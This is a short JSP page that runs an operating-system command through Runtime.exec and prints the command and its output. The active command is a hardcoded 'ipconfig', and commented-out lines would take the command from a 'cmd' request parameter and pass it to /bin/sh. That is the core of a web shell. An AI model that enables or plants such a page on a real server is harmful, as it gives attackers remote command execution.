<%@ page import="java.io.BufferedReader"%><%@ page import="java.io.InputStreamReader"%><%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8"%>

<%
//    String cmd = request.getParameter("cmd");
//    String cmdAll = "/bin/sh " + cmd;
//    String cmdAll = "/bin/sh whoami";
    String cmdAll = "ipconfig";
    //获取脚本执行的得到的结果并缓存

    StringBuffer sb = new StringBuffer();
    String str;
    try{
        //读取数据
        Process proc = Runtime.getRuntime().exec(cmdAll);
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        while ((str = reader.readLine()) != null) {
            sb.append(str + "\n");
        }
        reader.close();
        proc.waitFor();
    }catch (Exception e){
        sb.append(e.getMessage());
    }
%>

<%="cmd:" + cmdAll%>

<%="out:" + (sb.toString().isEmpty() ? "empty" : sb.toString())%>
